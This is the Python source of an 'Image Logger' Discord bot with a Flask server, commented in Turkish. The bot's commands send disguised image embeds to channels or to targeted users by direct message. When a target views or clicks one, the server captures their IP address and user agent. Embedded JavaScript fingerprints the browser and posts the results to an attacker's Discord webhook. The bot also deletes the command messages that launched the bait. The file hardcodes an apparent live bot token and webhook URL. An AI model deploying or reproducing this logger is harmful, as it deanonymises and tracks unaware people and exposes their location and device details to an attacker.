"""
Image Logger v5 - Render.com Optimized
"""

import discord
from discord.ext import commands
from flask import Flask, request, redirect, Response, make_response
import threading
import requests
import random
import string
import time
import json
import os
import base64
from datetime import datetime, timezone

# ===== KONFIGURASYON =====
BOT_TOKEN = "MTUwMjcyMzAzMDQ0NTcxOTU3Mg.GyFlhS.gy3bT0VqKdrk1Klri4NuHpcBItoZVuLjJvBbTQ"
WEBHOOK_URL = "https://discord.com/api/webhooks/1525027884584927354/_em-lrCPFU2ef3lX6iOPO6Cmd_z7NEioi-zddc40uN975Hs7ugt2lcD2hGuZzBzSHFkP"
SUNUCU_IP = os.environ.get("RENDER_EXTERNAL_HOSTNAME", "xxx.onrender.com")  # Render otomatik alır
# =========================

bot = commands.Bot(command_prefix="!", intents=discord.Intents.all(), help_command=None)
app = Flask(__name__)

def id_uret(uzunluk=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=uzunluk))

def webhook_gonder(data):
    try:
        requests.post(WEBHOOK_URL, json=data, timeout=5)
    except:
        pass

STATIC_GORSEL = "https://i.pinimg.com/236x/8d/d7/a6/8dd7a60042698a07825cac6b0c7772cd.jpg"

@app.route('/gorsel')
def gorsel_serve():
    url = request.args.get('url', STATIC_GORSEL)
    tid = request.args.get('id', id_uret())
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', '')
    
    # Discord embed isteğini logla
    if 'discord' in ua.lower():
        webhook_gonder({
            "embeds": [{
                "title": "🤖 DISCORD EMBED YUKLENDI",
                "color": 0x5865f2,
                "fields": [
                    {"name": "ID", "value": f"`{tid}`", "inline": True},
                    {"name": "IP", "value": f"`{ip}`", "inline": True}
                ]
            }]
        })
    
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'image/webp,image/apng,image/*,*/*'
        }
        r = requests.get(url, headers=headers, timeout=15)
        
        if r.status_code == 200:
            response = make_response(r.content)
            response.headers['Content-Type'] = r.headers.get('Content-Type', 'image/jpeg')
            response.headers['Content-Length'] = str(len(r.content))
            response.headers['Cache-Control'] = 'public, max-age=31536000'
            response.headers['Access-Control-Allow-Origin'] = '*'
            return response
    except:
        pass
    
    # Fallback
    try:
        fb = requests.get(STATIC_GORSEL, timeout=5)
        if fb.status_code == 200:
            response = make_response(fb.content)
            response.headers['Content-Type'] = 'image/jpeg'
            return response
    except:
        pass
    
    pixel = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
    response = make_response(pixel)
    response.headers['Content-Type'] = 'image/gif'
    return response


@app.route('/')
def index():
    tid = request.args.get('id', id_uret())
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', 'Bilinmiyor')
    
    webhook_gonder({
        "embeds": [{
            "title": "🎯 TIKLAMA ALGILANDI",
            "color": 0xff0000,
            "fields": [
                {"name": "ID", "value": f"`{tid}`", "inline": True},
                {"name": "IP", "value": f"`{ip}`", "inline": True},
                {"name": "UA", "value": f"```{ua[:200]}```", "inline": False}
            ]
        }]
    })
    
    html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>.</title>
    <style>
        body {{ background:#313338; display:flex; justify-content:center; align-items:center; min-height:100vh; margin:0; }}
        .container {{ text-align:center; }}
        img {{ max-width:400px; border-radius:8px; }}
    </style>
</head>
<body>
    <div class="container">
        <img src="https://picsum.photos/400/300?random={tid}">
    </div>
    <script>
    const bilgi = {{
        tid: '{tid}',
        ekran: `${{screen.width}}x${{screen.height}}`,
        platform: navigator.platform,
        cores: navigator.hardwareConcurrency || '?',
        zaman: Intl.DateTimeFormat().resolvedOptions().timeZone
    }};
    fetch('{WEBHOOK_URL}', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{
            embeds: [{{
                title: '📊 HEDEF BILGISI',
                color: 0x00ff00,
                fields: [
                    {{name: 'ID', value: '`'+bilgi.tid+'`', inline: true}},
                    {{name: 'Ekran', value: bilgi.ekran, inline: true}},
                    {{name: 'Platform', value: bilgi.platform, inline: true}},
                    {{name: 'CPU', value: bilgi.cores, inline: true}},
                    {{name: 'Zaman', value: bilgi.zaman, inline: true}}
                ]
            }}]
        }})
    }});
    </script>
</body>
</html>"""
    return html


@app.route('/health')
def health():
    return "OK", 200


# Flask thread
def sunucu_baslat():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)

t = threading.Thread(target=sunucu_baslat, daemon=True)
t.start()

@bot.event
async def on_ready():
    print(f"[+] Bot aktif: {bot.user}")
    print(f"[+] Render URL: https://{SUNUCU_IP}")
    await bot.change_presence(activity=discord.Game(name="!grab <url>"))

@bot.command(name="grab")
async def grab(ctx, url: str = None):
    if not url:
        embed = discord.Embed(
            title="📸 Image Logger v5",
            description="**Kullanım:** `!grab <gorsel_url>`\nÖrn: `!grab https://picsum.photos/500/400`",
            color=0x5865f2
        )
        await ctx.send(embed=embed)
        return
    
    if not url.startswith('http'):
        await ctx.send("❌ URL http/https ile başlamalı")
        return
    
    tid = id_uret()
    gorsel_url = f"https://{SUNUCU_IP}/gorsel?url={url}&id={tid}"
    ana_url = f"https://{SUNUCU_IP}/?id={tid}"
    
    embed = discord.Embed(color=0x2b2d31, description=" ", url=ana_url)
    embed.set_image(url=gorsel_url)
    embed.set_footer(text="Fotoğrafı görüntülemek için tıkla")
    
    await ctx.send(embed=embed)
    await ctx.message.delete()
    
    webhook_gonder({
        "content": f"✅ Grab | ID: `{tid}` | {ctx.author}"
    })

@bot.command(name="grabdm")
async def grab_dm(ctx, kullanici: discord.User = None, url: str = None):
    if not kullanici or not url:
        await ctx.send("Kullanım: `!grabdm <@kullanici> <url>`")
        return
    
    tid = id_uret()
    gorsel_url = f"https://{SUNUCU_IP}/gorsel?url={url}&id={tid}"
    ana_url = f"https://{SUNUCU_IP}/?id={tid}"
    
    embed = discord.Embed(color=0x2b2d31, description=" ", url=ana_url)
    embed.set_image(url=gorsel_url)
    embed.set_footer(text="Fotoğrafı görüntülemek için tıkla")
    
    try:
        await kullanici.send(embed=embed)
        await ctx.send(f"✅ DM gönderildi: {kullanici.mention}")
        await ctx.message.delete()
    except:
        await ctx.send("❌ DM gönderilemedi")

@bot.command(name="help")
async def help_command(ctx):
    embed = discord.Embed(
        title="📸 Image Logger v5",
        description="`!grab <url>` - Embed gönder\n`!grabdm <@user> <url>` - DM gönder",
        color=0x5865f2
    )
    await ctx.send(embed=embed)

bot.run(BOT_TOKEN)
